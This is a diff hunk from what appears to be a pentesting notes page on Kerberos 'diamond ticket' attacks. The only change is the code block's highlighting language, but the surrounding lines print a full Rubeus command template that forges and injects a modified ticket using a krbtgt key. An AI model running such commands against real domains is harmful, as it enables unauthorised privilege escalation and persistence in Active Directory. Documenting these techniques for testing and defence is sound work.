@@ -4,7 +4,7 @@ A diamond ticket is created by decrypting a valid TGT, making changes to it and 
 
 ## Repackage the Ticket
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># With user password
+<pre class="language-batch" data-overflow="wrap"><code class="lang-batch"><strong># With user password
 </strong><strong>Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS /show /ptt
 </strong><strong>
 </strong><strong># With domain users
